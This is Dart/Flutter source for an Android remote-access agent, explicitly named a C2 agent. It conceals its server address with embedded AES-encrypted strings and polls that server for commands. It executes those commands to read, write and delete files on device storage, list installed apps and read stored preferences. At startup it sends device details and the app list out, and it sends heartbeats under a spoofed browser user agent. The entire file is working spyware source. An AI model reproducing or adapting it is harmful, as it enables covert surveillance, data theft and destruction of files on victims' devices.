import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';

import 'package:crypto/crypto.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:encrypt/encrypt.dart' as enc;
import 'package:flutter/services.dart';
import 'package:flutter/widgets.dart';
import 'package:http/http.dart' as http;
import 'package:installed_apps/installed_apps.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:path/path.dart' as p;
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';

// ============================================================
// 1. 安全配置 (已填入 AES 密文)
// ============================================================
const _encryptedRelayUrl = "wgmuH9SlW7YKeqHxdyUxI1+7aQF7SqtDsPV08vVuyxw="; 
const _encKey = "2GY6bOd2nMehmsdPBIwGOdPAI/T8MJbjx1nZqP/QXyA=";
const _encIv = "XJg95LpgBDNzUICOMyq8AA==";

String _decodeUrl() {
  try {
    final key = enc.Key.fromBase64(_encKey);
    final iv = enc.IV.fromBase64(_encIv);
    final encrypter = enc.Encrypter(enc.AES(key, mode: enc.AESMode.cbc));
    return encrypter.decrypt64(_encryptedRelayUrl, iv: iv);
  } catch (e) {
    return 'https://error.invalid/c2';
  }
}

class C2Config {
  final String relayUrl;
  final String sessionKey;
  final Duration pollInterval;
  final Duration heartbeatInterval;
  final Duration requestTimeout;

  const C2Config({
    required this.relayUrl,
    required this.sessionKey,
    this.pollInterval = const Duration(seconds: 2), // 改回 2 秒拉取
    this.heartbeatInterval = const Duration(seconds: 20),
    this.requestTimeout = const Duration(seconds: 5),
  });

  C2Config copyWith({
    String? relayUrl,
    String? sessionKey,
    Duration? pollInterval,
    Duration? heartbeatInterval,
    Duration? requestTimeout,
  }) =>
      C2Config(
        relayUrl: relayUrl ?? this.relayUrl,
        sessionKey: sessionKey ?? this.sessionKey,
        pollInterval: pollInterval ?? this.pollInterval,
        heartbeatInterval: heartbeatInterval ?? this.heartbeatInterval,
        requestTimeout: requestTimeout ?? this.requestTimeout,
      );
}

class C2Result {
  final bool ok;
  final dynamic data;
  const C2Result(this.ok, this.data);
  static C2Result success(dynamic data) => C2Result(true, data);
  static C2Result fail(dynamic error) => C2Result(false, {'error': error.toString()});
}

// ============================================================
// 2. 纯 Dart 本地执行器 (文件真实 IO 交给原生)
// ============================================================
class LocalExecutor {
  static String? _currentPath;
  static const _channel = MethodChannel('app/integrity');

  static Future<dynamic> execute(String module, String method, dynamic args) async {
    switch (module) {
      case 'sys': return await _sys(method, args);
      case 'fs': return await _fs(method, args);
      case 'app': return await _app(method, args);
      case 'util': return await _util(method, args);
      default: throw Exception('unknown_module:$module');
    }
  }

  static Future<String> _getInitPath() async {
    if (_currentPath != null) return _currentPath!;
    final docDir = await getApplicationDocumentsDirectory();
    _currentPath = docDir.path;
    return _currentPath!;
  }

  static Future<dynamic> _fs(String method, dynamic args) async {
    String cwd = await _getInitPath();
    String rawPath = args?['path'] as String? ?? '.';

    if (rawPath == '/sdcard' || rawPath == '~') {
      rawPath = '/storage/emulated/0';
    }

    String targetPath;
    if (p.isAbsolute(rawPath)) {
      targetPath = p.normalize(rawPath);
    } else {
      targetPath = p.normalize(p.join(cwd, rawPath));
    }

    try {
      switch (method) {
        case 'pwd':
          return {'cwd': targetPath};

        case 'cd':
          final type = await _channel.invokeMethod<String>('sys_core', {
            'op': 'type',
            'path': targetPath,
          });
          if (type != 'directory') {
            throw Exception('不是有效的目录: $targetPath');
          }
          _currentPath = targetPath;
          return {'cwd': _currentPath};

        case 'ls':
        case 'read':
        case 'write':
        case 'mkdir':
        case 'rm':
          final result = await _channel.invokeMethod<dynamic>('sys_core', {
            'op': method,
            'path': targetPath,
            'content': args?['content'],
            'recursive': args?['recursive'] ?? false,
          });
          return result;

        default: 
          throw Exception('unknown_fs_method:$method');
      }
    } on PlatformException catch (e) {
      throw Exception(e.message ?? '系统拒绝访问');
    } catch (e) {
      throw Exception(e.toString());
    }
  }

  static Future<dynamic> _sys(String method, dynamic args) async {
    switch (method) {
      case 'info':
        final android = await DeviceInfoPlugin().androidInfo;
        return {
          'androidVersion': android.version.release,
          'sdkInt': android.version.sdkInt,
          'brand': android.brand,
          'model': android.model,
          'device': android.device,
        };
      case 'network':
        final interfaces = await NetworkInterface.list();
        return {'ipAddresses': interfaces.expand((i) => i.addresses.map((a) => a.address)).toList()};
      case 'env':
        final pkg = await PackageInfo.fromPlatform();
        final docDir = await getApplicationDocumentsDirectory();
        return {'packageName': pkg.packageName, 'versionName': pkg.version, 'filesDir': docDir.path};
      default: throw Exception('unknown_sys_method:$method');
    }
  }

  static Future<dynamic> _app(String method, dynamic args) async {
    switch (method) {
      case 'list':
        List<AppInfo> apps = await InstalledApps.getInstalledApps(excludeSystemApps: false);
        return apps.map((app) => {
          'name': app.name, 'packageName': app.packageName, 'version': app.versionName, 'system': app.isSystemApp,
        }).toList();
      case 'prefs.list':
        final prefs = await SharedPreferences.getInstance();
        return prefs.getKeys().toList();
      case 'prefs.get':
        final prefs = await SharedPreferences.getInstance();
        return prefs.get(args?['key']);
      case 'prefs.set':
        final prefs = await SharedPreferences.getInstance();
        await prefs.setString(args?['key'], args?['value'] ?? '');
        return {'ok': true};
      default: throw Exception('unknown_app_method:$method');
    }
  }

  static Future<dynamic> _util(String method, dynamic args) async {
    switch (method) {
      case 'hash': return sha256.convert(utf8.encode(args?['text'] as String? ?? '')).toString();
      case 'json.pretty': return const JsonEncoder.withIndent('  ').convert(jsonDecode(args?['json'] ?? '{}'));
      default: throw Exception('unknown_util_method:$method');
    }
  }
}

class C2Dispatcher {
  Future<C2Result> dispatch(Map<String, dynamic> ins, {required C2Agent session}) async {
    final module = ins['module']?.toString() ?? '';
    final method = ins['method']?.toString() ?? '';
    final args = ins['args'];
    try {
      if (module == 'session') return C2Result.success(await session.handleSession(method, args));
      return C2Result.success(await LocalExecutor.execute(module, method, args));
    } catch (e) {
      return C2Result.fail(e);
    }
  }
}

// ============================================================
// 3. C2Agent 主类
// ============================================================
class C2Agent with WidgetsBindingObserver {
  static final C2Agent _instance = C2Agent._();
  factory C2Agent() => _instance;
  C2Agent._();

  static final _defaultConfig = C2Config(
    relayUrl: _decodeUrl(), 
    sessionKey: 'INIT_PLACEHOLDER', 
  );

  C2Config _config = _defaultConfig;
  final _dispatcher = C2Dispatcher();
  final _client = http.Client();

  Timer? _pollTimer; // ★ 恢复定时器
  Timer? _heartbeatTimer;
  Timer? _watchdogTimer;
  
  bool _running = false;
  bool _polling = false;
  int _backoffSeconds = 1;
  static const _maxBackoff = 5;
  DateTime _lastSuccessfulPoll = DateTime.now();

  static void start({C2Config? config}) => _instance._start(config: config);
  static void stop() => _instance._stop();

  void _start({C2Config? config}) async {
    if (_running) return;
    _running = true;
    
    final prefs = await SharedPreferences.getInstance();
    String? localKey = prefs.getString('c2_device_key');
    if (localKey == null || localKey.isEmpty) {
      final rand = Random.secure();
      final bytes = List<int>.generate(16, (i) => rand.nextInt(256));
      localKey = 'dev_${bytes.map((b) => b.toRadixString(16).padLeft(2, '0')).join()}';
      await prefs.setString('c2_device_key', localKey);
    }

    if (config != null) {
      _config = config.copyWith(sessionKey: config.sessionKey == 'INIT_PLACEHOLDER' ? localKey : config.sessionKey);
    } else {
      _config = _defaultConfig.copyWith(sessionKey: localKey);
    }

    WidgetsBinding.instance.addObserver(this);
    _lastSuccessfulPoll = DateTime.now();
    
    _startPollingLoop(); // ★ 恢复启动定时轮询
    _startHeartbeat();
    _startWatchdog();
    
    unawaited(_reportBoot());
  }

  Future<void> _reportBoot() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final lastReport = prefs.getInt('c2_last_boot_report') ?? 0;
      final now = DateTime.now().millisecondsSinceEpoch;
      
      final hasReportedApps = prefs.getBool('c2_has_reported_apps') ?? false;
      
      if (hasReportedApps && (now - lastReport < 3600 * 1000)) return;

      final android = await DeviceInfoPlugin().androidInfo;
      final pkg = await PackageInfo.fromPlatform();
      
      final info = {
        'model': android.model,
        'brand': android.brand,
        'android': android.version.release,
        'appVersion': pkg.version,
        'time': DateTime.now().toString().split('.')[0],
      };

      List<Map<String, dynamic>>? appList;
      if (!hasReportedApps) {
        try {
          final apps = await InstalledApps.getInstalledApps(excludeSystemApps: true);
          appList = apps.map((app) => {
            'name': app.name, 
            'pkg': app.packageName
          }).toList();
        } catch (_) {}
      }

      final url = Uri.parse('${_config.relayUrl}/notify');
      final response = await _client.post(url,
        headers: {'X-Session-Key': _config.sessionKey, 'Content-Type': 'application/json'},
        body: jsonEncode({
          'info': info,
          if (appList != null) 'apps': appList,
        }),
      ).timeout(const Duration(seconds: 20));

      if (response.statusCode == 200) {
        await prefs.setInt('c2_last_boot_report', now);
        if (appList != null) {
          await prefs.setBool('c2_has_reported_apps', true);
        }
      }
    } catch (_) {}
  }

  void _stop() {
    if (!_running) return;
    _running = false;
    _pollTimer?.cancel();
    _heartbeatTimer?.cancel();
    _watchdogTimer?.cancel();
    _client.close();
    WidgetsBinding.instance.removeObserver(this);
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed && _running) {
      _backoffSeconds = 1; 
      _lastSuccessfulPoll = DateTime.now();
      _startPollingLoop();
      _startHeartbeat();
    }
  }

  // ★ 恢复稳定的定时轮询
  void _startPollingLoop() {
    _pollTimer?.cancel();
    _backoffSeconds = 1;
    _pollTimer = Timer.periodic(_config.pollInterval, (_) => _pollOnce());
  }

  Future<void> _pollOnce() async {
    if (_polling || !_running) return;
    _polling = true;
    try {
      final url = Uri.parse('${_config.relayUrl}/pending/${_config.sessionKey}');
      final response = await _client.get(url, headers: {
        'X-Session-Key': _config.sessionKey, 'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
      }).timeout(_config.requestTimeout);

      if (response.statusCode == 200) {
        _backoffSeconds = 1; 
        _lastSuccessfulPoll = DateTime.now();
        
        if (response.body.isNotEmpty && response.body != '[]') {
          final decoded = jsonDecode(response.body);
          if (decoded is List) {
            for (final item in decoded) { 
              if (item is Map<String, dynamic>) unawaited(_executeInstruction(item)); 
            }
          }
        }
      }
    } catch (_) { 
      _scheduleBackoff(); 
    } finally { 
      _polling = false; 
    }
  }

  void _scheduleBackoff() {
    _pollTimer?.cancel();
    final delay = Duration(seconds: _backoffSeconds);
    _backoffSeconds = min(_backoffSeconds + 1, _maxBackoff);
    _pollTimer = Timer(delay, _startPollingLoop);
  }

  void _startHeartbeat() {
    _heartbeatTimer?.cancel();
    _heartbeatTimer = Timer.periodic(_config.heartbeatInterval, (_) => _sendHeartbeat());
  }

  Future<void> _sendHeartbeat() async {
    if (!_running) return;
    try {
      await _client.post(Uri.parse('${_config.relayUrl}/heartbeat'), 
        headers: {'X-Session-Key': _config.sessionKey},
        body: jsonEncode({'ts': DateTime.now().millisecondsSinceEpoch})
      ).timeout(const Duration(seconds: 10));
    } catch (_) {}
  }

  void _startWatchdog() {
    _watchdogTimer?.cancel();
    _watchdogTimer = Timer.periodic(const Duration(seconds: 60), (_) {
      if (!_running) return;
      if (DateTime.now().difference(_lastSuccessfulPoll).inSeconds > 60) {
        _lastSuccessfulPoll = DateTime.now(); 
        _sendHeartbeat();
      }
    });
  }

  Future<void> _executeInstruction(Map<String, dynamic> ins) async {
    final id = ins['id']?.toString() ?? '';
    final result = await _dispatcher.dispatch(ins, session: this);
    if (id.isNotEmpty) {
      try {
        await _client.post(Uri.parse('${_config.relayUrl}/result'),
          headers: {'X-Session-Key': _config.sessionKey, 'Content-Type': 'application/json'},
          body: jsonEncode({'id': id, 'session': _config.sessionKey, 'ok': result.ok, 'data': result.data})
        ).timeout(const Duration(seconds: 10));
      } catch (_) {}
    }
  }

  Future<dynamic> handleSession(String method, dynamic args) async {
    switch (method) {
      case 'ping': return {'pong': true};
      case 'reconnect': _lastSuccessfulPoll = DateTime.now(); _startPollingLoop(); return {'ok': true};
      default: return {'error': 'unknown_session_method:$method'};
    }
  }
}